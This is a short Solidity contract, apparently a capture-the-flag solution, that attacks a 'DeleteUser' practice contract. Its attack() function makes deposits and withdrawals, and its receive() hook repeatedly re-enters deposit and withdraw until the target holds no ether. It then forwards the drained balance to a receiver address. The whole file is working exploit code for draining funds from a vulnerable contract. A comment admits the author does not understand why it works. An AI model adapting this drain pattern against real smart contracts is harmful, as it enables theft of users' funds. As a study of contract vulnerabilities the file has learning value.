// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import {DeleteUser} from "./DeleteUser.sol";

contract DeleteUserAttacker {
    DeleteUser private target;
    address private receiver;

    constructor(DeleteUser _target, address _receiver) {
        target = _target;
        receiver = _receiver;
    }

    // I actually don't get how I solved this
    function attack() external payable {
        target.deposit{value: msg.value}();
        target.deposit();
        target.withdraw(2);
    }

    receive() external payable {
        if (address(target).balance == 0) {
            receiver.call{value: address(this).balance}("");
            return;
        }
        target.deposit();
        target.withdraw(1);
    }
}
